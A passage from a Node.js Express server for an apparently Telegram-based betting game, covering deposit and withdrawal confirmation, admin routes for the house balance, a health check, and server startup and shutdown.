    if (status === 'confirmed' && tx.type === 'deposit') {
      const u = await User.findOneAndUpdate({ telegramId: tx.userId },
        { $inc: { balance: tx.amount, totalDeposited: tx.amount } }, { new: true });
      if (u) io.emit('balanceUpdate', { userId: tx.userId, balance: u.balance });
    }
    if (status === 'rejected' && tx.type === 'withdraw') {
      const u = await User.findOneAndUpdate({ telegramId: tx.userId },
        { $inc: { balance: tx.amount, totalWithdrawn: -tx.amount } }, { new: true });
      if (u) io.emit('balanceUpdate', { userId: tx.userId, balance: u.balance });
    }
    tx.status = status; tx.adminNote = adminNote || '';
    tx.confirmedBy = req.headers['x-telegram-id']; tx.confirmedAt = new Date();
    await tx.save();
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false }); }
});

app.get('/api/admin/house', adminGuard, (req, res) => {
  res.json({ success: true, houseBalance, round: roundCounter, phase: G.phase, bots: BOT_POOL.size });
});
app.post('/api/admin/house/balance', adminGuard, (req, res) => {
  const amt = Number(req.body.amount);
  if (!Number.isFinite(amt) || amt < 0) return res.status(400).json({ success: false });
  houseBalance = amt;
  res.json({ success: true, houseBalance });
});

app.get('/health', (req, res) => res.json({
  status: 'ok', phase: G.phase, round: roundCounter,
  bots: BOT_POOL.size, db: dbReady, house: houseBalance,
}));

// ─── Start ────────────────────────────────────────────────────────────────────
startGameLoop();
if (process.env.BOT_TOKEN) {
  bot.launch().then(() => console.log('🤖 Bot started')).catch(console.error);
}
const PORT = Number(process.env.PORT) || 3000;
server.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
const shutdown = sig => { bot.stop(sig); server.close(() => mongoose.disconnect().then(() => process.exit(0))); };
process.once('SIGINT',  () => shutdown('SIGINT'));
process.once('SIGTERM', () => shutdown('SIGTERM'));
